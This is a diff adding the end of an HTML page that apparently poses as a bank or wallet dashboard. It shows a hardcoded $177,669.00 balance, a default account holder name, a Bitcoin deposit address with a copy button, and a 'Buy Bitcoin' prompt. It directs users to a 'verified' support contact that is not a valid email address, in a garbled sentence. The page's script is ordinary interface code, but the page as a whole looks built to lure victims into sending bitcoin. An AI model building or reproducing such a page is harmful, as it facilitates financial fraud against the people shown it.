+            <div class="address-value" id="bitcoinAddress">3LzffgMaFEeqtsuvGPPRhLXaD9EFhWFaem</div>
+            <button class="copy-btn" id="copyButton" aria-label="Copy Bitcoin address to clipboard">
+                Copy
+                <span class="copy-tooltip" id="copyTooltip">Copied!</span>
+            </button>
+        </div>
+    </div>
+    
+    <button class="cta-button" id="buyButton" aria-label="Buy Bitcoin">
+        Buy Bitcoin
+    </button>
+    
+    <p class="support-text">
+        Please Varsonofy email our support team at <span class="support-email">greendot.verified.com</span> for assistance with purchasing Bitcoin. We're here to guide you through the process.
+    </p>
+</div>
+
+<div class="toast" id="successToast">Purchase initiated successfully!</div>
+    <!-- Bottom Navigation -->
+    <nav class="bottom-nav">
+        <a href="home.html" class="nav-item active">
+            <i class="fas fa-home nav-icon"></i>
+            <span>Home</span>
+        </a>
+        <a href="history.html" class="nav-item">
+            <i class="fas fa-history nav-icon"></i>
+            <span>History</span>
+        </a>
+    </nav>
+
+    <script>
+        // Get user data from localStorage
+        document.addEventListener('DOMContentLoaded', function() {
+            const userName = localStorage.getItem('userName') || 'Benjamin Leal';
+            
+            // Update welcome message
+            document.getElementById('welcomeText').textContent = `You're welcome, ${userName}`;
+        });
+        
+        // Toggle balance visibility
+        let balanceVisible = true;
+        document.getElementById('eyeToggle').addEventListener('click', function() {
+            const balanceAmount = document.getElementById('balanceAmount');
+            const eyeIcon = document.querySelector('#eyeToggle i');
+            
+            if (balanceVisible) {
+                balanceAmount.textContent = '••••••••';
+                eyeIcon.className = 'fas fa-eye-slash';
+            } else {
+                balanceAmount.textContent = '$177,669.00';
+                eyeIcon.className = 'fas fa-eye';
+            }
+            
+            balanceVisible = !balanceVisible;
+        });
+        
+        // Menu functionality
+        const menuToggle = document.getElementById('menuToggle');
+        const menuDropdown = document.getElementById('menuDropdown');
+        
+        menuToggle.addEventListener('click', function(e) {
+            e.stopPropagation();
+            menuDropdown.classList.toggle('active');
+        });
+        
+        // Close menu when clicking outside
+        document.addEventListener('click', function() {
+            menuDropdown.classList.remove('active');
+        });
+        
+        // Prevent menu from closing when clicking inside
+        menuDropdown.addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
+        
+        // Logout functionality
+        document.getElementById('logoutBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            localStorage.removeItem('userName');
+            localStorage.removeItem('userEmail');
+            window.location.href = 'index.html';
+        });
+        
+        // Flip card functionality
+        const cardContainer = document.getElementById('cardContainer');
+        
+        cardContainer.addEventListener('click', function() {
+            this.classList.toggle('flipped');
+        });
+
+        // Prevent text selection on double click
+        cardContainer.addEventListener('mousedown', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
